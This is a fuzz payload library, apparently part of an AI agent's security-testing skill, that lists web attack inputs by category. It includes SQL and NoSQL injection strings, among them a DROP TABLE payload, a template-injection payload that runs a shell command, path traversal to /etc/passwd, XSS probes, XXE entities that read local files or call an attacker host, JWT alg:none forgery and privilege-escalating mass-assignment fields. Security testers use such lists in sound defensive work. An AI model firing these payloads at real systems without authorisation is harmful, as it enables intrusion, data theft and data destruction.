# Fuzz Payload Library

Reference payloads grouped by attack category. Use as input to the 8-category test matrix in SKILL.md.

---

## 1. Boundary Values — Integers
```
0
-1
-999999
1
2147483647      (INT_MAX 32-bit)
2147483648      (INT_MAX + 1 → overflow)
-2147483648     (INT_MIN 32-bit)
9223372036854775807  (INT_MAX 64-bit)
9999999999999999999  (overflow 64-bit)
NaN
Infinity
-Infinity
1.7976931348623157e+308  (float max)
```

## 2. Boundary Values — Strings
```
(empty string)
" "             (whitespace only)
"null"          (string literal null)
"undefined"
"true"
"false"
"0"
"-1"
"NaN"
aaaaaa...       (100 chars)
aaaaaa...       (1000 chars)
aaaaaa...       (10000 chars — potential DoS)
aaaaaa...       (100000 chars)
```

## 3. Type Confusion
```json
// Where integer expected
{"id": "not-a-number"}
{"id": null}
{"id": [1, 2, 3]}
{"id": {"$gt": 0}}   // NoSQL operator injection

// Where string expected
{"email": 12345}
{"email": true}
{"email": ["a@b.com", "c@d.com"]}
{"email": null}

// Where boolean expected
{"active": "true"}
{"active": "1"}
{"active": 1}
{"active": null}
{"active": "yes"}
```

## 4. SQL Injection
```
'
''
`
')
'))
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
'; DROP TABLE users--
' UNION SELECT null--
' UNION SELECT null,null--
1 AND 1=1
1 AND 1=2
1' AND '1'='1
admin'--
1; WAITFOR DELAY '0:0:5'--    (MSSQL time-based)
1 AND SLEEP(5)--               (MySQL time-based)
1' AND SLEEP(5)--
```

## 5. NoSQL Injection
```json
{"$gt": ""}
{"$ne": null}
{"$where": "1==1"}
{"$regex": ".*"}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

## 6. Template / SSTI Injection
```
{{7*7}}              → expect 49 = Jinja2/Twig confirmed
${7*7}               → expect 49 = FreeMarker/Spring EL
<%= 7*7 %>           → expect 49 = ERB (Ruby)
{{config}}           → Flask/Jinja2 config dump
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
#{7*7}               → Pebble / Thymeleaf
*{7*7}               → Thymeleaf
@{7*7}               → Thymeleaf
```

## 7. Path Traversal
```
../
../../
../../../etc/passwd
....//....//etc/passwd
..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd   (double URL encode)
/etc/passwd
C:\Windows\System32\drivers\etc\hosts
```

## 8. XSS Probes
```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)
<svg onload=alert(1)>
<body onload=alert(1)>
```

## 9. XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<foo>&xxe;</foo>
```

## 10. JWT Attacks
```
# alg:none — remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>.

# Weak secret bruteforce targets
secret
password
123456
jwt_secret
your-256-bit-secret
```

## 11. Mass Assignment Extras
```json
{"role": "admin"}
{"is_admin": true}
{"is_verified": true}
{"balance": 999999}
{"credits": 999999}
{"permissions": ["*"]}
{"email_verified_at": "2020-01-01"}
{"account_type": "premium"}
{"subscription": "enterprise"}
```

## 12. HTTP Method Override
```
X-HTTP-Method-Override: DELETE
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
_method=DELETE
```
